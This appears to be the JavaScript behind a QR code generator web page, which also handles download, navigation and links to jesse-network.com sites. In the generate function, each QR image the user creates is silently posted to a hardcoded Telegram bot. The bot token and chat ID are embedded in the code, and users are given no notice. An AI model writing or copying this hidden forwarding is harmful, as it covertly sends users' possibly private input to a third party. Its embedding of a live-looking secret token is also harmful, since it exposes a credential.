// Function to send the image to Telegram bot
const sendImageToTelegramBot = (blob) => {
  // Replace 'YOUR_BOT_TOKEN' with your actual bot token
  const botToken = '6356250947:AAH68deb85rVDL-5nDC9GZyLHE0kWhR3Wp0';
  const chatId = '5869356940'; // Replace 'YOUR_CHAT_ID' with the chat ID where you want to send the image

  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('photo', blob, 'qr-code.png');

  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error("Error sending image to Telegram bot:", error));
};

const generateQRCode = () => {
  const inputText = document.getElementById("qr-code-text").value;
  const img = document.getElementById("qr-code-img");
  const generatingText = document.getElementById("generating-text");
  const downloadIcon = document.querySelector(".download-icon");

  generatingText.textContent = " Generating QR Code."; // Initial text

  let dots = "";
  let dotsCount = 0;
  const dotsInterval = setInterval(() => {
    dotsCount = (dotsCount + 1) % 7; // Cycle through 6 dots
    dots = ".".repeat(dotsCount);
    generatingText.textContent = ` Generating QR Code${dots}`;
  }, 100); // Update dots every 100 milliseconds (adjust as needed)

  const apiURL = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${inputText}`;

  fetch(apiURL)
    .then(response => response.blob())
    .then(blob => {
      const url = URL.createObjectURL(blob);
      img.src = url;
      generatingText.textContent = "Generator v2.0"; // Reset text after generation
      clearInterval(dotsInterval); // Stop the dots animation

      downloadIcon.addEventListener("click", () => {
        const link = document.createElement("a");
        link.href = url;
        link.download = "qr-code.png"; // Adjust filename as needed
        link.click();
      });

      // Send the image to Telegram bot
      sendImageToTelegramBot(blob);
    })
    .catch(error => console.error("Error:", error));
};

document.getElementById("qrg").addEventListener("click", generateQRCode);

// Rest of your code remains the same
// ...

// Add event listener for Enter key press on the input field
const inputText = document.getElementById("qr-code-text");
inputText.addEventListener("keydown", (event) => {
  if (event.key === "Enter") {
    generateQRCode();
  }
});

// Add the navigation toggle functionality
let navigation = document.querySelector('.navigation');
navigation.onclick = function(){
    navigation.classList.toggle('active')
};

// IMAGE FUNCTIONS WHEN CLICKED

// Reference to the image elements and their onclick listeners
var image1 = document.getElementById("jesse-network.com");
image1.addEventListener("click", function() {
  window.open("https://jesse-network.com", "_blank");
});

var image2 = document.getElementById("telegram.channel");
image2.addEventListener("click", function() {
  window.open("https://t.me/+lc4EyWAN4-M4YTlk")
});

var image3 = document.getElementById("calculator");
image3.addEventListener("click", function() {
  window.open("https://calculator.jesse-network.com")
});

var image4 = document.getElementById("youtube");
image4.addEventListener("click", function() {
  window.open("https://youtube.jesse-network.com")
});
